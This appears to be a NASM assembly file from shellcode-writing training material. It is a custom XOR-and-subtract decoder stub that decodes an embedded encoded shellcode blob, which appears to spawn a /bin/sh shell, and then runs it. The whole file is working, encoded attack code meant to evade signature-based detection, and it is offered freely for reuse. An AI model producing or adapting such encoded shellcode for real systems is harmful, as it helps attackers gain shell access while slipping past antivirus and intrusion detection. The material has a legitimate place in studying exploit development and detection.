; Filename: custom_encoder.nasm
; Author:  Rob W
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;You are free to use and redistribute this code as you wish
;
; Purpose: Custom encoder that makes use of addition and xor

global _start			

section .text
_start:

	jmp short call_decoder

decoder:
	pop esi

decode:
	xor byte [esi], 0xdd
	jz Shellcode
	sub byte [esi], 0xa
	inc esi
	jmp short decode

call_decoder:

	call decoder
	Shellcode: db 0xe6, 0x17, 0x87, 0xaf, 0xe4, 0xe4, 0xa0, 0xaf, 0xaf, 0xe4, 0xb1, 0xae, 0xa5, 0x4e, 0x30, 0x87, 0x4e, 0x31, 0x80, 0x4e, 0x36, 0x67, 0xc8, 0x0a, 0x57, 0xdd
